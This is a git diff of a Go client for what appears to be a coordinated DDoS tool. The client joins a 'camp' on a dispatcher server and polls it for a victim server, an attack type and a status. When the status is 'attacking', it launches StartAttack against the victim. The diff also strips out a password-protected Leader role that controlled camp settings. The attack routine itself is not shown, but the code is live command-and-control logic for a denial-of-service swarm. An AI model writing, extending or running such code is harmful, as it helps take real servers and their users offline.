@@ -8,26 +8,36 @@ import (
 	"github.com/fatih/color"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
 )
 
-type Leader struct {
-	Client
-	Password string
-}
-
 type Client struct {
 	http.Client      `json:"-"`
 	Name             string `json:"name"`
 	DispatcherServer string `json:"-"`
+	Speed            int    `json:"speed"`
+}
+
+func (c *Client) Ping() error {
+	rq, err := http.NewRequest("GET", c.DispatcherServer+"/ping", nil)
+	if err != nil {
+		return err
+	}
+	do, err := c.Do(rq)
+	if err != nil {
+		return err
+	}
+	if do.StatusCode == http.StatusOK {
+		return nil
+	}
+	return errors.New("error in pinging")
 }
 
 func (c *Client) GetCamp() CampAPI {
-	//get request to dispatcher server /camp
-
-	rq, err := http.NewRequest("GET", c.DispatcherServer+"/camp", nil)
+	rq, err := http.NewRequest("GET", c.DispatcherServer+"/camp?speed="+strconv.Itoa(c.Speed)+"&name="+c.Name, nil)
 	if err != nil {
 		return CampAPI{}
 	}
@@ -72,101 +82,48 @@ func (c *Client) JoinCamp() error {
 	return errors.New(msg)
 }
 
-func (l *Leader) RemoveFromCamp(password string) error {
-	//delete request to dispatcher server /camp/
-	//with body {name: c.Name}
-	rq, err := http.NewRequest("DELETE", l.DispatcherServer+"/camp", nil)
-	rq.Header.Add("Authorization", password)
-
-	if err != nil {
-		return err
-	}
-	do, err := l.Do(rq)
-	defer do.Body.Close()
-	if err != nil {
-		return err
-	}
-	if do.StatusCode == http.StatusOK {
-		return nil
-	} else {
-		//return the body as error message
-		var msg string
-		_ = json.NewDecoder(do.Body).Decode(&msg)
-		return errors.New(msg)
-	}
-}
-
-func (l *Leader) UpdateCampSettings(settings CampSettings) error {
-	//put request to dispatcher server /camp/
-	//convert settings to json and put it in the body
-	jr, err := json.Marshal(settings)
-	if err != nil {
-		return err
-	}
-
-	rq, err := http.NewRequest("PUT", l.DispatcherServer+"/camp", bytes.NewReader(jr))
-	if err != nil {
-		return err
-	}
-	rq.Header.Add("Authorization", l.Password)
-
-	do, err := l.Do(rq)
-	defer do.Body.Close()
-	if err != nil {
-		return err
-	}
-	if do.StatusCode == http.StatusOK {
-		return nil
-	} else {
-		var msg string
-		_ = json.NewDecoder(do.Body).Decode(&msg)
-		return errors.New(msg)
-	}
-}
-
-func (c *Client) ListenAndDo(ChangedDataChan chan CampAPI, logChan chan string) {
+func (c *Client) ListenAndDo(changedDataChan chan CampAPI, logChan chan string) {
+	defer func() {
+		if r := recover(); r != nil {
+			//clear screen
+			fmt.Print("\033[H\033[2J")
+			color.Red("Dispatcher server is stopped")
+			os.Exit(0)
+		}
+	}()
 	prevCmp := c.GetCamp()
-	ChangedDataChan <- prevCmp
+	changedDataChan <- prevCmp
 	stopchan := make(chan bool, 1)
 	stopchan <- false
-
-	var cmp CampAPI
 	for {
-		cmp = c.GetCamp()
-		if !cmp.Equals(prevCmp) {
+		cmp := c.GetCamp()
+		if yes, message := cmp.Equals(prevCmp); !yes {
 			select {
-			case <-ChangedDataChan:
+			case <-changedDataChan:
 			default:
 			}
-			ChangedDataChan <- cmp
-			if cmp.Settings.DDOSType != prevCmp.Settings.DDOSType {
-				logChan <- "change attack mode " + cmp.Settings.DDOSType
-			}
-			if cmp.Settings.Status == "attacking" {
-				go StartAttack(cmp.Settings.VictimServer, cmp.Settings.DDOSType, stopchan, logChan)
-			}
-			if cmp.Settings.VictimServer != prevCmp.Settings.VictimServer {
-				logChan <- "Victim server changed to " + cmp.Settings.VictimServer
-			}
-
-			if cmp.Settings.Status == "stopped" {
-				select {
-				case <-stopchan:
-				default:
+			changedDataChan <- cmp
+			logChan <- message
+			if cmp.Settings.Status != prevCmp.Settings.Status {
+				if cmp.Settings.Status == "attacking" {
+					go c.StartAttack(cmp.Settings.VictimServer, cmp.Settings.DDOSType, stopchan, logChan)
 				}
-				stopchan <- true
+				if cmp.Settings.Status == "stopped" {
+					select {
+					case <-stopchan:
+					default:
+					}
+					stopchan <- true
+				}
 			}
 			prevCmp = cmp
-			time.Sleep(2 * time.Second)
 		}
+		time.Sleep(500 * time.Millisecond)
 	}
 }
-
 func (c *Client) Start() {
 	err := c.JoinCamp()
 	if err != nil {
-		//check if error contain connection refused
-		//if yes, then the dispatcher server is not running
 		if strings.Contains(err.Error(), "connection refused") {
 			color.Red("Dispatcher server is not running")
 			return
@@ -187,49 +144,6 @@ func (c *Client) Start() {
 
 	go func() {
 		StartSoldierView(ChangedDataChan, logChan)
-		wg.Done()
-	}()
-	wg.Wait()
-}
-
-func (l *Leader) ListenChangeView(changedDataChan chan CampAPI) {
-	prevCamp := l.GetCamp()
-	changedDataChan <- prevCamp
-	for {
-		camp := l.GetCamp()
-		if !camp.Equals(prevCamp) {
-			select {
-			case <-changedDataChan:
-			default:
-			}
-			changedDataChan <- camp
-		}
-		time.Sleep(1 * time.Second)
-	}
-}
-func (l *Leader) Start() {
-
-	func() {
-		defer func() {
-			if r := recover(); r != nil {
-				color.Red("Dispatcher server is not running")
-				os.Exit(0)
-			}
-		}()
-		l.GetCamp()
-	}()
-
-	var changedDataChan = make(chan CampAPI, 1)
-	logChan := make(chan string, 10)
-	wg := sync.WaitGroup{}
-	wg.Add(1)
-
-	go func() {
-		l.ListenChangeView(changedDataChan)
-		wg.Done()
-	}()
-	go func() {
-		l.StartLeaderView(changedDataChan, logChan)
 		wg.Done()
 	}()
 	wg.Wait()
